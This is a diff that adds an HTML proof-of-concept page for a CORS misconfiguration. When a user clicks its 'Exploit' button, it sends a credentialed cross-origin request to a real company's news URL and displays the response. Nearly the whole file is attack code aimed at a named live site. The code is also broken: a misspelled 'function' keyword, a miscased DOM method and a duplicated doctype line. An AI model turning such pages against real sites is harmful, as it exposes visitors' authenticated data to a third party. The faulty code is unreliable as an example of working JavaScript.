@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+<head>
+	<title> Test - nc </title>
+</head>
+<body>
+<center>
+	<h2> CORS POC for nc </h2>
+	<div id="test">
+		<button type="button" onclick="cors()"> Exploit </button>
+	</div>
+<script> function cors() {
+	var xhttp = new XMLHttpRequest();
+	xhttp.onreadystatechange = unction()
+	{
+		if (this.readyState == 4&& this.status == 200){
+			document.getElementByID("test").innerHTML = alert(this.responseText);
+		}
+	};
+	xhttp.open("GET","https://kr.ncsoft.com/kr/pr/news.do", true);
+	xhttp.withCredentials = true;
+	xhttp.send();
+}
+</script>
+</center>
+</body>
+</html>
